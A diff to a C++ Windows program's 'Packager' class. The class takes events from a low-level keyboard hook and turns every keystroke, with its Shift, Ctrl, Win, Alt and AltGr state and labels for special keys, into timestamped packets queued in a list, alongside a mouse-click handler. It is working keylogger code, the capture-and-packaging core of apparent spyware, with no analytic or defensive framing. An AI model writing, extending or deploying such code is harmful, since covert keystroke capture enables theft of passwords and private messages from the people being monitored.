@@ -6,6 +6,35 @@ Packager::Packager()
 	_shift = false;
 	_win = false;
 	_ctrl = false;
+	_alt = false;
+	_altGr = false;
+
+	correspondance[112] = "[F1]";
+	correspondance[113] = "[F2]";
+	correspondance[114] = "[F3]";
+	correspondance[115] = "[F4]";
+	correspondance[116] = "[F5]";
+	correspondance[117] = "[F6]";
+	correspondance[118] = "[F7]";
+	correspondance[119] = "[F8]";
+	correspondance[120] = "[F9]";
+	correspondance[121] = "[F10]";
+	correspondance[122] = "[F11]";
+	correspondance[123] = "[F12]";
+	correspondance[45] = "[INSER]";
+	correspondance[36] = "[HOME]";
+	correspondance[33] = "[PAGE UP]";
+	correspondance[34] = "[PAGE DOWN]";
+	correspondance[46] = "[DEL]";
+	correspondance[35] = "[END]";
+	correspondance[8] = "[BACKSPACE]";
+	correspondance[13] = "[ENTER]";
+	correspondance[38] = "[UP]";
+	correspondance[40] = "[DOWN]";
+	correspondance[37] = "[LEFT]";
+	correspondance[39] = "[RIGHT]";
+	correspondance[93] = "[MENU]";
+
 }
 
 
@@ -15,49 +44,57 @@ Packager::~Packager()
 
 void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 	KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
-	if ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == 256) {
-		_shift = true;
-	}
-	if ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == 257) {
-		_shift = false;
-	}
-	if ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == 256) {
-		_ctrl = true;
-	}
-	if ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == 257) {
-		_ctrl = false;
-	}
-	if ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == 256) {
-		_win = true;
-	}
-	if ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == 257) {
-		_win = false;
-	}
+	_shift = ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == 256) ? true : _shift;
+	_shift = ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == 257) ? false : _shift;
+
+	_ctrl = ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == 256) ? true : _ctrl;
+	_ctrl = ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == 257) ? false : _ctrl;
+
+	_win = ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == 256) ? true : _win;
+	_win = ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == 257) ? false : _win;
+
+	_alt = (info->vkCode == 164 && wParam == 260) ? true : _alt;
+	_alt = (info->vkCode == 164 && wParam == 257) ? false : _alt;
+
+	_altGr = (info->vkCode == 165 && wParam == 260) ? true : _altGr;
+	_altGr = (info->vkCode == 165 && wParam == 257) ? false : _altGr;
+
 
 	BYTE kbdState[256];
 	GetKeyboardState(kbdState);
 	WCHAR buff[2];
-	if (ToUnicode(info->vkCode, info->scanCode, kbdState, buff, 2, 0) > 0) {
-		PaquetKeys *tmp = new PaquetKeys();
-		tmp->setDate(info->time);
-		std::wstring ws(buff);
-		std::string  str;
-		if (_shift) {
-			str += "[MAJ] ";
-		}
-		if (_ctrl) {
-			str += "[CTRL] ";
-		}
-		if (_win) {
-			str += "[WIN] ";
-		}
-		str.append(ws.begin(), ws.end());
-		std::cout << "string UNICODE : " << str << std::endl;
-		tmp->setText(str);
-		tmp->createPaquet();
-		_paquets.push_back(tmp);
-		
+
+	PaquetKeys *tmp = new PaquetKeys();
+	tmp->setDate(info->time);
+	std::string  str;
+	if (_shift) {
+		str += "[MAJ] ";
 	}
+	if (_ctrl) {
+		str += "[CTRL] ";
+	}
+	if (_win) {
+		str += "[WIN] ";
+	}
+	if (_alt) {
+		str += "[ALT] ";
+	}
+	if (_altGr) {
+		str += "[ALT GR] ";
+	}
+	if ((info->vkCode != 13 && info->vkCode != 8) && (ToUnicode(info->vkCode, info->scanCode, kbdState, buff, 2, 0) > 0)) {
+		std::wstring ws(buff);
+		str.append(ws.begin(), ws.end());
+	}
+	else {
+		str += correspondance[info->vkCode];
+	}
+	std::cout << "string UNICODE : " << str << std::endl;
+	tmp->setText(str);
+	tmp->createPaquet();
+	mutex.lock();
+	_paquets.push_back(tmp);
+	mutex.unlock();
 }
 
 void Packager::addClick(int nCode, WPARAM wParam, LPARAM lParam) {
